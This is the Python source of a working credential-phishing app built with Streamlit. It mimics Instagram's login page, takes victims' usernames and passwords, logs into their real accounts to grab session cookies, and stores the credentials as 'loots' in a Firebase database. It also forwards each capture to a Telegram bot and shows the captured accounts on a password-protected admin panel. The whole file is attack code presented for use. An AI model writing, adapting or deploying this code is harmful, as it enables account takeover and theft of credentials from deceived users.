import streamlit as st
import requests
import instaloader
import time
from datetime import datetime, timedelta
import pandas as pd

# --- [ إعدادات الزعيم - قم بتعديلها ] ---
DB_URL = "https://syko-booster-default-rtdb.firebaseio.com/"
ADMIN_PASS = "SYKO_BOSS_2026"
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN" # اختياري: ضع توكن بوتك هنا
TELEGRAM_CHAT_ID = "YOUR_ID"     # اختياري: ضع ايدي حسابك هنا

# --- [ وظائف النظام الخلفية ] ---
def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage?chat_id={TELEGRAM_CHAT_ID}&text={msg}"
        requests.get(url)
    except: pass

def check_queue():
    """نظام الطابور لمنع الحظر"""
    activity = requests.get(f"{DB_URL}activity.json").json()
    if not activity: return True, 0
    now = datetime.now()
    recent = [t for t in activity.values() if now - datetime.strptime(t['time'], "%Y-%m-%d %H:%M:%S") < timedelta(minutes=5)]
    return len(recent) < 5, len(recent)

def capture_logic(u, p):
    L = instaloader.Instaloader()
    L.context.user_agent = "Instagram 123.0.0.21.114 (Android 10; Xiaomi; Redmi Note 7)"
    try:
        L.login(u, p)
        sid = L.context._session.cookies.get_dict().get('sessionid')
        return True, sid
    except Exception as e:
        return False, str(e)

# --- [ واجهة المستخدم CSS ] ---
st.set_page_config(page_title="Instagram", layout="centered")
st.markdown("""
    <style>
    .stApp { background-color: #000; }
    .insta-box { background: #000; border: 1px solid #363636; padding: 40px; text-align: center; }
    .insta-logo { font-family: 'Billabong', sans-serif; font-size: 50px; color: white; }
    input { background-color: #121212 !important; border: 1px solid #363636 !important; color: white !important; }
    .stButton>button { background-color: #0095f6 !important; color: white !important; width: 100%; border-radius: 8px; font-weight: bold; }
    </style>
    <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
""", unsafe_allow_html=True)

# --- [ التنقل ] ---
page = st.sidebar.selectbox("SYKO MENU", ["Login", "Admin Dashboard"])

# ----------------- 1. صفحة تسجيل الدخول -----------------
if page == "Login":
    st.markdown("<div class='insta-box'><span class='insta-logo'>Instagram</span>", unsafe_allow_html=True)
    
    is_safe, count = check_queue()
    if not is_safe:
        st.error(f"⚠️ System busy. Please wait 2 minutes.")
    else:
        u = st.text_input("Username", placeholder="Phone number, username, or email")
        p = st.text_input("Password", type="password", placeholder="Password")
        
        if st.button("Log In"):
            if u and p:
                with st.spinner(''):
                    # تسجيل النشاط للطابور
                    requests.post(f"{DB_URL}activity.json", json={"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
                    
                    success, result = capture_logic(u, p)
                    u_clean = u.replace(".","_").replace("@","")
                    
                    if success:
                        requests.put(f"{DB_URL}loots/{u_clean}.json", json={"u": u, "p": p, "sid": result, "status": "LIVE"})
                        send_telegram(f"✅ NEW LOOT: {u} | Pass: {p}")
                        st.success("Logged in! Redirecting...")
                        time.sleep(2)
                        st.balloons()
                    else:
                        requests.put(f"{DB_URL}fails/{u_clean}.json", json={"u": u, "p": p, "error": result})
                        st.error("Incorrect password. Please try again.")
    st.markdown("</div>", unsafe_allow_html=True)

# ----------------- 2. لوحة تحكم الزعيم -----------------
else:
    st.title("👨‍💻 Admin Panel")
    if st.text_input("Password", type="password") == ADMIN_PASS:
        # إحصائيات سريعة
        col1, col2 = st.columns(2)
        loots = requests.get(f"{DB_URL}loots.json").json() or {}
        fails = requests.get(f"{DB_URL}fails.json").json() or {}
        
        col1.metric("Captured Accounts", len(loots))
        col2.metric("Failed Attempts", len(fails))
        
        st.write("### 🎯 Recent Loots")
        if loots:
            st.table(pd.DataFrame.from_dict(loots, orient='index')[['u', 'p', 'sid']])
            if st.button("Clear History"):
                requests.delete(f"{DB_URL}loots.json")
                st.rerun()
    else:
        st.warning("Enter the Admin Key to view data.")
